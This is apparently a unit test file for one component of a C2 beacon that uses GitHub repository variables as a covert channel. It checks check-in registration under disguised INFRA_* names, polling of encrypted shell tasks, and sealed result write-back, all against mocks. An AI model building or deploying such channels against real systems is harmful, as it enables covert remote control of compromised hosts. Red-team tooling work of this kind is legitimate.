import { describe, it, expect, mock, beforeEach } from "bun:test";

// ── Octokit mock factory ──────────────────────────────────────────────────────

function makeActions(overrides: Record<string, any> = {}) {
  return {
    listRepoVariables:  mock(async () => ({ data: { variables: [] } })),
    getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    createRepoVariable: mock(async () => ({})),
    updateRepoVariable: mock(async () => ({})),
    deleteRepoVariable: mock(async () => ({})),
    ...(overrides ?? {}),
  };
}

function makeOctokit(actionsOverrides: Record<string, any> = {}) {
  return {
    hook: { wrap: (_name: string, _fn: Function) => {} },
    rest: {
      actions: makeActions(actionsOverrides),
      repos:   { get: mock(async () => ({})) },
    },
  } as any;
}

// Mock @octokit/rest before importing anything that imports it
mock.module("@octokit/rest", () => ({
  Octokit: class {
    hook = { wrap: (_name: string, _fn: Function) => {} };
    rest  = {
      actions: makeActions(),
      repos:   { get: mock(async () => ({})) },
    };
  },
}));

import { SecretsTentacle } from "../tentacles/SecretsTentacle.ts";
import {
  generateKeyPair, encryptBox, openSealBox, bytesToBase64,
} from "../crypto/sodium.ts";
import { decodeBase64Url, verifyEnvelope } from "@octoc2/shared";
import type { BeaconConfig } from "../types.ts";
import { signedCheckin } from "./signedCheckinFixture.ts";

// ── Helpers ───────────────────────────────────────────────────────────────────

async function makeConfig(overrides: Partial<BeaconConfig> = {}): Promise<BeaconConfig> {
  const operatorKp = await generateKeyPair();
  const beaconKp   = await generateKeyPair();
  return {
    id: "aabbccdd-1122-3344-5566-778899aabbcc",
    repo: { owner: "testowner", name: "testrepo" },
    token: "ghp_test",
    tentaclePriority: ["secrets"],
    sleepSeconds: 60,
    jitter: 0.3,
    operatorPublicKey: operatorKp.publicKey,
    beaconKeyPair: beaconKp,
    ...overrides,
  } as BeaconConfig;
}

const CHECKIN_PAYLOAD = {
  beaconId:  "aabbccdd-1122-3344-5566-778899aabbcc",
  publicKey: "",
  hostname:  "infra-host",
  username:  "deploy",
  os:        "linux",
  arch:      "x64",
  pid:       42,
  checkinAt: new Date().toISOString(),
};

// ── Tests ─────────────────────────────────────────────────────────────────────

describe("SecretsTentacle kind", () => {
  it("kind is 'secrets'", async () => {
    const t = new SecretsTentacle(await makeConfig());
    expect(t.kind).toBe("secrets");
  });
});

describe("SecretsTentacle.isAvailable()", () => {
  it("returns true when listRepoVariables succeeds (200)", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);
    (t as any).octokit = makeOctokit({
      listRepoVariables: mock(async () => ({ data: { variables: [] } })),
    });
    expect(await t.isAvailable()).toBe(true);
  });

  it("returns false when listRepoVariables throws (401/403/404)", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);
    (t as any).octokit = makeOctokit({
      listRepoVariables: mock(async () => { throw Object.assign(new Error("Forbidden"), { status: 403 }); }),
    });
    expect(await t.isAvailable()).toBe(false);
  });

  it("returns false and never throws on unexpected error", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);
    (t as any).octokit = makeOctokit({
      listRepoVariables: mock(async () => { throw new Error("Network error"); }),
    });
    await expect(t.isAvailable()).resolves.toBe(false);
  });
});

describe("SecretsTentacle.checkin() — ACK registration", () => {
  it("writes INFRA_CFG_* ACK variable on first checkin", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    const updateVar = mock(async () => ({}));
    const createVar = mock(async () => ({}));
    const getVar    = mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: updateVar,
      createRepoVariable: createVar,
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    getVar,
    });

    await t.checkin(await signedCheckin(cfg, CHECKIN_PAYLOAD));

    // Either updateRepoVariable or createRepoVariable must have been called
    const ackWritten = updateVar.mock.calls.length > 0 || createVar.mock.calls.length > 0;
    expect(ackWritten).toBe(true);

    // Check the written variable has the correct INFRA_CFG_ prefix
    const writeCalls = [...updateVar.mock.calls, ...createVar.mock.calls];
    const varName = ((writeCalls[0] as any)[0] as any).name as string;
    expect(varName).toMatch(/^INFRA_CFG_/);
    expect(varName).toContain(cfg.id.slice(0, 8));
  });

  it("ACK variable contains the signed checkin and matching public key", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    let capturedValue: string | undefined;
    const captureCreate = mock(async (params: any) => {
      capturedValue = params.value;
      return {};
    });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
      createRepoVariable: captureCreate,
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    });

    await t.checkin(await signedCheckin(cfg, CHECKIN_PAYLOAD));

    expect(capturedValue).toBeDefined();
    const decoded = JSON.parse(Buffer.from(capturedValue!, "base64").toString("utf8"));
    expect(decoded.publicKey).toBe(await bytesToBase64(cfg.beaconKeyPair.publicKey));
    expect(decoded.identity.kind).toBe("checkin");
    expect(decoded.identity.payload.beaconId).toBe(cfg.id);
    expect(decoded.identity.payload.encryptionPublicKey).toBe(decoded.publicKey);
    const signingPublicKey = await decodeBase64Url(
      decoded.identity.payload.signingPublicKey,
    );
    expect(await verifyEnvelope(decoded.identity, signingPublicKey)).toBe(true);
  });

  it("refreshes the signed ACK variable on every checkin and keeps polling", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    const updateVar = mock(async () => ({}));
    const getVar    = mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: updateVar,
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    getVar,
    });

    const firstPayload = await signedCheckin(cfg, {
      ...CHECKIN_PAYLOAD,
      checkinAt: "2026-07-16T12:00:00.000Z",
    });
    const secondPayload = await signedCheckin(cfg, {
      ...CHECKIN_PAYLOAD,
      checkinAt: "2026-07-16T12:00:01.000Z",
    });
    await t.checkin(firstPayload);
    await t.checkin(secondPayload);

    expect(updateVar).toHaveBeenCalledTimes(2);
    expect(getVar).toHaveBeenCalledTimes(2);
    const decodeAck = (call: any) => JSON.parse(
      Buffer.from(call[0].value, "base64").toString("utf8"),
    );
    const firstAck = decodeAck(updateVar.mock.calls[0] as any);
    const secondAck = decodeAck(updateVar.mock.calls[1] as any);
    expect(secondAck.identity.sequence).toBe(secondPayload.identity!.sequence);
    expect(secondAck.identity.signature).not.toBe(
      firstAck.identity.signature,
    );
  });
});

describe("SecretsTentacle.checkin() — task polling", () => {
  it("returns [] when INFRA_STATE variable is absent (404)", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => ({})),
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    });

    const tasks = await t.checkin(await signedCheckin(cfg, CHECKIN_PAYLOAD));
    expect(tasks).toEqual([]);
  });

  it("decrypts tasks from INFRA_STATE variable and deletes it after reading", async () => {
    const operatorKp = await generateKeyPair();
    const beaconKp   = await generateKeyPair();
    const cfg = await makeConfig({ operatorPublicKey: operatorKp.publicKey, beaconKeyPair: beaconKp });
    const t   = new SecretsTentacle(cfg);

    const taskPayload = [{ taskId: "task-aabb", kind: "shell", args: { cmd: "id" } }];
    const encrypted   = await encryptBox(
      JSON.stringify(taskPayload),
      beaconKp.publicKey,
      operatorKp.secretKey,
    );

    const deleteVar = mock(async () => ({}));
    const getVar    = mock(async (params: any) => {
      if ((params.name as string).startsWith("INFRA_STATE_")) {
        return { data: { value: JSON.stringify(encrypted) } };
      }
      throw Object.assign(new Error("Not Found"), { status: 404 });
    });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => ({})),
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: deleteVar,
      getRepoVariable:    getVar,
    });

    const tasks = await t.checkin(await signedCheckin(cfg, CHECKIN_PAYLOAD));

    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.taskId).toBe("task-aabb");
    expect(tasks[0]!.kind).toBe("shell");

    // Variable should have been deleted after reading
    expect(deleteVar.mock.calls.length).toBeGreaterThan(0);
    const deletedVarName = ((deleteVar.mock.calls[0] as any)[0] as any).name as string;
    expect(deletedVarName).toMatch(/^INFRA_STATE_/);
  });

  it("returns [] and does not throw when INFRA_STATE value is malformed", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => ({})),
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => ({ data: { value: "not-valid-json" } })),
    });

    const tasks = await t.checkin(await signedCheckin(cfg, CHECKIN_PAYLOAD));
    expect(tasks).toEqual([]);
  });

  it("returns [] and does not throw when INFRA_STATE value is empty", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => ({})),
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => ({ data: { value: "" } })),
    });

    const tasks = await t.checkin(await signedCheckin(cfg, CHECKIN_PAYLOAD));
    expect(tasks).toEqual([]);
  });
});

describe("SecretsTentacle.submitResult()", () => {
  it("writes an INFRA_LOG_* variable with sealed payload", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig({ operatorPublicKey: operatorKp.publicKey });
    const t   = new SecretsTentacle(cfg);

    const updateVar = mock(async () => ({}));
    const createVar = mock(async () => ({}));

    (t as any).octokit = makeOctokit({
      updateRepoVariable: updateVar,
      createRepoVariable: createVar,
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    });

    const result = {
      taskId:      "task-ccdd1122",
      beaconId:    "aabbccdd-1122-3344-5566-778899aabbcc",
      success:     true,
      output:      "deploy ok",
      completedAt: new Date().toISOString(),
    };

    await t.submitResult(result);

    // Either update or create must have been called
    const varWritten = updateVar.mock.calls.length > 0 || createVar.mock.calls.length > 0;
    expect(varWritten).toBe(true);

    // Variable name should match INFRA_LOG_ prefix with first 8 chars of taskId
    const writeCalls = [...updateVar.mock.calls, ...createVar.mock.calls];
    const varName = ((writeCalls[0] as any)[0] as any).name as string;
    expect(varName).toMatch(/^INFRA_LOG_/);
    expect(varName).toContain("task-ccd".slice(0, 8));
  });

  it("result variable value is a sealed base64 string decryptable with operator key", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig({ operatorPublicKey: operatorKp.publicKey });
    const t   = new SecretsTentacle(cfg);

    let capturedValue: string | undefined;
    const captureCreate = mock(async (params: any) => {
      capturedValue = params.value;
      return {};
    });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
      createRepoVariable: captureCreate,
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    });

    const result = {
      taskId:      "task-eeff0011",
      beaconId:    "aabbccdd-1122-3344-5566-778899aabbcc",
      success:     true,
      output:      "status: ok",
      completedAt: new Date().toISOString(),
    };

    await t.submitResult(result);

    expect(capturedValue).toBeDefined();
    // Decrypt and verify
    const plainBytes = await openSealBox(capturedValue!, operatorKp.publicKey, operatorKp.secretKey);
    const plain = new TextDecoder().decode(plainBytes);
    const decoded = JSON.parse(plain);
    expect(decoded.taskId).toBe("task-eeff0011");
    expect(decoded.output).toBe("status: ok");
  });
});

describe("SecretsTentacle.teardown()", () => {
  it("preserves registration and unread task variables", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    const remove = mock(async () => ({}));
    (t as any).octokit = makeOctokit({ deleteRepoVariable: remove });

    await t.teardown();

    expect(remove).not.toHaveBeenCalled();
  });
});
